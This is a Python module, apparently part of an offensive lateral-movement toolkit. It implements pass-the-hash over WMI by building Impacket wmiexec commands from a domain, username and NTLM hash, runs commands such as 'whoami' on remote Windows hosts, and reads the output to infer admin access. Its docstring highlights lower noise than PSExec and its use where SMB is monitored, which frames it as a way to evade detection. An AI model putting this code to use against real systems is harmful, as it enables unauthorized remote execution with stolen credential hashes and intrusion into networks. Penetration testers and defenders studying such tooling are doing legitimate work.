"""
WMI Pass-the-Hash using Impacket's wmiexec
Excellent for command execution with less noise than PSExec
"""

import sys
from pathlib import Path
from typing import Optional, Tuple

# Add parent to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent))

from .base import BaseAuthMethod
from ..core.models import AuthMethod, AccessLevel, Credential


class WMIAuthMethod(BaseAuthMethod):
    """
    Pass-the-Hash via WMI using Impacket's wmiexec

    WMI is a powerful remote management protocol. wmiexec
    provides a semi-interactive shell through WMI.

    Advantages:
        - No service installation (unlike PSExec)
        - Uses legitimate Windows management interface
        - Good for environments where SMB is monitored

    Disadvantages:
        - Requires WMI service running
        - Can be blocked by firewall rules
    """

    method = AuthMethod.WMI_IMPACKET

    def __init__(self, timeout: int = 30):
        super().__init__(timeout)
        self.default_command = "whoami"

    def build_command(self, target: str, credential: Credential,
                      command: Optional[str] = None) -> str:
        """
        Build Impacket wmiexec command

        Format: wmiexec.py domain/username@target -hashes :ntlm_hash command

        Args:
            target: Target IP or hostname
            credential: Credential with username, hash, domain
            command: Command to execute (defaults to 'whoami')

        Returns:
            wmiexec command string
        """
        exec_command = command or self.default_command

        cmd = (
            f"wmiexec.py "
            f"{credential.domain}/{credential.username}@{target} "
            f"-hashes :{credential.ntlm_hash} "
            f"'{exec_command}'"
        )

        return cmd

    def parse_output(self, output_text: str) -> Tuple[bool, AccessLevel, Optional[str]]:
        """
        Parse wmiexec output

        Args:
            output_text: wmiexec command output

        Returns:
            Tuple of (success, access_level, error_message)
        """
        output_lower = output_text.lower()

        # WMI typically requires admin, so if it works, we likely have admin
        error_indicators = [
            'error',
            'access denied',
            'rpc_s_access_denied',
            'connection refused',
            'timed out'
        ]

        for indicator in error_indicators:
            if indicator in output_lower:
                return False, AccessLevel.NONE, f"WMI failed: {indicator}"

        # If we got output without errors, WMI worked (implies admin)
        if output_text.strip():
            return True, AccessLevel.ADMIN, None

        return False, AccessLevel.NONE, "No response from WMI"